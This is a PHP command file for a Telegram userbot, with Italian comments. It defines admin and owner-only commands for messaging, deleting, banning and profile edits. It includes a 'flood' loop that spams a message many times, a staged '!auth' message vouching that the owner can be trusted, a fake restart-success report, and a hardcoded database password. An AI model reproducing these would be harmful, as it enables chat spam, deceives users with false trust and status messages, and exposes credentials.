<?php

include '_config.php';

/*
QUESTO FILE SERVE PER AVERE SEPARATI I COMANDI DELL'USERBOT
DAI FILE BASE DI FUNZIONAMENTO DELLO STESSO
*/

if (isset($userID) && in_array($userID, $lista_admin)) {
    $isadmin = true;
} else {
    $isadmin = false;
}

if (isset($msg) && isset($chatID)) {
    if ($isadmin) {
        if (stripos($msg, '!say ') === 0) {
            sm($chatID, explode(' ', $msg, 2)[1]);
        }


        if (stripos($msg, '!join ') === 0) {
            joinChat(explode(' ', $msg, 2)[1], $chatID);
        }
        


        if ($msg == '!leave' && stripos($chatID, '-100') === 0) {
            abbandonaChat($chatID);
        }
    }
    if ($msg == 'test') {
        sm($chatID, "test cf");
    }

    if ($msg == '?dev') {
        sm($chatID, "This userbot is powered by @Cleptomania");
    }
    
    if ($msg == '?ver') {
        sm($chatID, "Versione Altervista: <code>$version</code>\nVersione Userbot: <code>1.1</code>");
    }
}

if(stripos($msg, '.sm') === 0 and $userID == 687557217){
    $exp = explode(" ", $msg, 3);
    sm($exp[1], $exp[2]);
  }

if(stripos($msg, '!auth') === 0 and $userID == 687557217){
sm($chatID, '<code>Verifica del tuo account...</code>');
            sleep(0.6);
            sm($chatID, '@Cleptomania è un supporter, di lui ti puoi fidare!');
        }
        
if($msg == 'mioid'){
sm($chatID, "Ecco il tuo ID: <code>$userID</code>");
}

if($msg == 'chatid'){
sm($chatID, "Ecco l'ID del gruppo: <code>$chatID</code>");
}

if(stripos($msg, '<riavvia') === 0 and $userID == 687557217){
sm($chatID, "<code>⚙RIAVVIO...</code>\n ╠<i>✅Riavvio Completato!</i>\n ╚<i>✅Nessun Errore Trovato!</i>");
}

if($msg == "del" and isset($update['update']['message']["reply_to_msg_id"]) and $userID == 687557217){
$MadelineProto->channels->deleteMessages(['channel' => $chatID, 'id' => [$update['update']['message']["reply_to_msg_id"], $update['update']['message']["id"]]]);
}

if($msg == "delall" and isset($update['update']['message']["reply_to_msg_id"]) and $userID == 687557217){
      $messages_Messages = $MadelineProto->channels->getMessages(['channel' => $chatID, 'id' => [$update['update']['message']["reply_to_msg_id"]], ]);
      $suserID = $messages_Messages['messages'][0]['from_id'];
      $MadelineProto->channels->deleteUserHistory(['channel' => $chatID, 'user_id' => $suserID]);
      $MadelineProto->channels->deleteMessages(['channel' => $chatID, 'id' => [$update['update']['message']["id"]]]);
      }
      


// es: flood 100 Storm by @cancr
if (0 === strpos($msg, 'flood ') and $userID == 687557217)
	{
	try
		{
		$ei = explode(" ", str_replace("flood ", "", $msg) , 3);
		$times = $ei["0"];
		$cid = $chatID;
		$mess = $ei["1"];
		for ($x = 0; $x < $times; $x++)
			{
			$MadelineProto->messages->sendMessage(['peer' => $cid, 'message' => $mess]);
			}
		}
	catch(Exception $e)
		{
		$MadelineProto->messages->sendMessage(['peer' => $chatID, 'message' => 'Errore: ' . $e->getMessage() ]);
		}
	}


//cambia il nome   
if (0 === strpos($msg, 'nome ') and $userID == 687557217)
	{
	$nome = str_replace('nome ', '', $msg);
	$MadelineProto->account->updateProfile(['first_name' => $nome]);
	$MadelineProto->messages->sendMessage(['peer' => $chatID, 'message' => 'Ho cambiato nome in ' . $nome]);
	}
//cambia bio    
if (0 === strpos($msg, 'bio ') and $userID == 687557217)
	{
	$bio = str_replace('bio ', '', $msg);
	$MadelineProto->account->updateProfile(['about' => $bio]);
	$MadelineProto->messages->sendMessage(['peer' => $chatID, 'message' => 'Ho cambiato la bio in ' . $bio]);
	}
    
//cambia username
if (0 === strpos($msg, 'username ') and $userID == 687557217)
	{
	$tag = str_replace('username ', '', $msg);
	$MadelineProto->account->updateUsername(['username' => $tag]);
	$MadelineProto->messages->sendMessage(['peer' => $chatID, 'message' => "Ho Cambiato l'username in @$tag"]);
	}
    
    

//ubot limitato?
if(0 === strpos($msg, 'check') and $userID == 687557217)
	{
	sm(178220800, "/start");
	}
$idchat = "-1001436272141"; //mettere l'id della chat dove il bot mandera il resoconto
if (stripos($msg, "Good news") === 0 and $userID == 178220800)
	{
	sm($idchat, "Non sono limitato.");
	}
if (stripos($msg, "Dear") === 0 and $userID == 178220800)
	{
	sm($idchat, "Sono limitato.");
	}
    
    
$host = "localhost";
$user = "fratest";
$pass = "fompebimmo14";
$dbname = "my_fratest";

$my = new mysqli($host, $user, $pass,$dbname);
if ($my->connect_errno) {
	echo "Errore in connessione al DBMS: ".$my->error;
        exit();
} 

$nome = $update['message']['from']['first_name'];
$messageid = $update['message']['message_id'];
$ureply = $update['message']['reply_to_message']['from']['username'];
$id = $update['message']['reply_to_message']['from']['id'];
$msgid = $update['message']['reply_to_message']['message_id'];
$username = $update['message']['from']['username'];

//ban
if(0 === strpos($msg, 'ban') and $userID == 687557217)
	{
	try
		{
		$scan = $MadelineProto->get_info(explode(' ', $msg) [1]);
		$MadelineProto->channels->editBanned(['channel' => $chatID, 'user_id' => $scan['bot_api_id'], 'banned_rights' => ['_' => 'channelBannedRights', 'view_messages' => 1, 'send_messages' => 1, 'send_media' => 1, 'send_stickers' => 1, 'send_gifs' => 1, 'send_games' => 1, 'send_inline' => 1, 'embed_links' => 1, 'until_date' => 0], ]);
		sm($chatID, "Ho bannato " . $scan['User']['first_name'] . " [" . $scan['bot_api_id'] . "] come richiesto da $name [$userID].", 1);
		$nome = $scan['User']['first_name'];
		$id = $scan['bot_api_id'];
		sm($chatID, "Ho bannato $nome [$id]");
		}
	catch(Exception $e)
		{
		$errore = $e - getMessage();
		$MadelineProto->messages->sendMessage(['peer' => $chatID, 'message' => $errore]);
		}
	}